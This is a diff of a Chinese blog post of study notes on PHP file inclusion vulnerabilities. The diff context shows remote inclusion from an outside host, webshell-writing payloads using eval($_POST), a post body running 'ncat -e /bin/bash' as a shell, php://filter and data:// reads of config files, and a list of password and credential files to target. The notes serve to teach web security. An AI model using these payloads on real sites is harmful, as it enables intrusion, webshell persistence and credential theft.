@@ -1,6 +1,6 @@
 ---
 layout:     post
-title:      Web笔记（九）文件包含漏洞
+title:      Web笔记（十）文件包含漏洞
 subtitle:   这个系列是整理学习安全的笔记，包括Web和PWN的一些知识。本章是学习文件包含漏洞，记录的一些笔记。
 date:       2020-12-02
 author:     HouKC
@@ -71,7 +71,6 @@ tags:
 #### 2. 远程文件包含
 
 可以直接执行任意代码。
-
 ```
 http://xxx.com/xxx.php?file=http://xxx.com/x.php
 ```
@@ -82,7 +81,6 @@ http://xxx.com/xxx.php?file=http://xxx.com/x.php
 
 ## 0x05 漏洞挖掘
 
-	* 
 通过白盒代码审计
 * 
 黑盒工具挖掘
@@ -99,7 +97,6 @@ http://xxx.com/xxx.php?file=http://xxx.com/x.php
 
 - inlcude()等函数通过动态变量的方式引入需要包含的文件
 - 用户能控制该动态变量
-
 ```php
 <?php
 $test=$_GET['c'];
@@ -117,7 +114,6 @@ include($test);
 
 * 
 %00截断包含（PHP<5.3.4）（magic_quotes_gpc=off才可以，否则%00会被转义）
-
 ```php
 <?php
 include $_GET['x'].".php";
@@ -130,13 +126,11 @@ echo $_GGET['x'].".php";
 ## 0x07 利用技巧
 
 首先上传图片马，马包含以下代码：
-
 ```php
 <?fputs(fopen("shell.php"),"w"),"<?php eval($_POST[x]);?>"?>
 ```
 
-上传后图片路径为假设为/uploadfile/x.jpg，当访问http://127.0.0.1/xx.php?page=uploadfile/x.jpg时，将会在文件夹下生成shell.php，内容为
-
+上传后图片路径为假设为/uploadfile/x.jpg，当访问http://127.0.0.1/xx.php?page=uploadfile/x.jpg 时，将会在文件夹下生成shell.php，内容为
 ```php
 <?php eval($_POST[x]);?>
 ```
@@ -147,13 +141,13 @@ echo $_GGET['x'].".php";
 
 #### 1. Windows
 
-- C:\boot.ini  //查看系统版本
-- C:\Windows\System32\inetsrv\MetaBase.xml  //IIS配置文件
-- C:\Windows\repair\sam  //存储系统初次安装的密码
-- C:\Program Files\mysql\my.ini  //Mysql配置
-- C:\Program Files\mysql\data\mysql\user.MYD  //Mysql root
-- C:\Windows\php.ini  //php配置信息
-- C:\Windows\my.ini  //Mysql配置信息
+- C:\boot.ini        //查看系统版本
+- C:\Windows\System32\inetsrv\MetaBase.xml        //IIS配置文件
+- C:\Windows\repair\sam        //存储系统初次安装的密码
+- C:\Program Files\mysql\my.ini        //Mysql配置
+- C:\Program Files\mysql\data\mysql\user.MYD        //Mysql root
+- C:\Windows\php.ini        //php配置信息
+- C:\Windows\my.ini        //Mysql配置信息
 
 #### 2. Linux
 
@@ -187,7 +181,6 @@ echo $_GGET['x'].".php";
 日志会记录客户端请求及服务器响应的信息，访问http://www.com/\<?php phpinfo(); ?\>时，\<?php phpinfo();?\>也会被记录在日志里，也可以插入到User-Agent中。注意可以用Burpsuite发送来绕过URL编码。
 
 示例：制作错误，写入一句话
-
 ```
 http://127.0.0.1/ekucms/index.php?s=my/show/id/{~eval($_POST[x])}
 ```
@@ -199,7 +192,6 @@ http://127.0.0.1/ekucms/index.php?s=my/show/id/{~eval($_POST[x])}
 ## 0x0a 读PHP文件
 
 直接包含php文件时会被解析，不能看到源码，可以用封装协议读取：
-
 ```
 ?page=php://filter/read=convert.base64-encode/resource=config.php
 ```
@@ -211,7 +203,6 @@ http://127.0.0.1/ekucms/index.php?s=my/show/id/{~eval($_POST[x])}
 ## 0x0b PHP封装协议
 
 当allow_url_include=On时，若执行http://www.com/index.php?page=php://input ，并且提交数据
-
 ```
 <?php fputs(fopen("shell.php","w"),"<?php eval($_POST[x])?>")?>
 ```
@@ -225,7 +216,6 @@ http://127.0.0.1/ekucms/index.php?s=my/show/id/{~eval($_POST[x])}
 远程的文件名不能为php可解析的扩展名，allow_url_fopen和allow_url_include为On是必须的。
 
 若在a.txt写入
-
 ```
 <?php fputs(fopen("shell.php","w"),"<?php @eval($_POST[x]);?>")?>
 ```
@@ -245,7 +235,6 @@ php://input是个可以访问请求的原始数据的只读流。POST请求的�
 enctype="multipart/form-data"的时候php://input是无效的。
 
 #### 2. 利用php://input 插入一句话木马
-
 ```php
 <?php
 @eval(file_get_contents('php://input'));    
@@ -253,7 +242,6 @@ enctype="multipart/form-data"的时候php://input是无效的。
 ```
 
 php://input是用来接收post数据，在post中插入数据：
-
 ```
 system('ncat -e /bin/bash localhost 1234');
 ```
@@ -263,19 +251,16 @@ system('ncat -e /bin/bash localhost 1234');
 #### 3. php://input将文件包含漏洞变成代码执行漏洞
 
 文件中存在包含漏洞的代码：
-
 ```php
 <?php @include($_GET['file'])?>
 ```
 
 使用php://input，将执行代码通过hackbar在POST data中提交，即构造请求，请求链接如下：
-
 ```
 http://127.0.0.1/index.php?file=php://input
 ```
 
 然后用hackbar或其他工具在POST data处写入：
-
 ```
 <?php system('ifconfig');?>
 ```
@@ -294,13 +279,11 @@ http://127.0.0.1/index.php?file=php://input
 - wordpress配置文件wp-config.php
 
 举个例子，读取指定文件FileInclude.php的代码：
-
 ```
 http://127.0.0.1/index.php?file=data:text/plain,<?php system('cat /var/www/FileInclude.php')?>
 ```
 
 注意，我们看到转化后的GET请求的参数中包含\<?的标记，在遇到有些WAF，包括云WAF（例如360网站卫士），就会被视为攻击代码而拦截下来，所以一般会加base64编码。
-
 ```
 # base64编码后传输
 data:text/plain;base64,[攻击代码的base64编码]
@@ -314,7 +297,6 @@ data:text/plain,[攻击代码]
 php://filter可以读取php文件的源码内容。
 
 用法：
-
 ```
 php://filter/read=convert.base64-encode/resource=[文件路径]
 ```
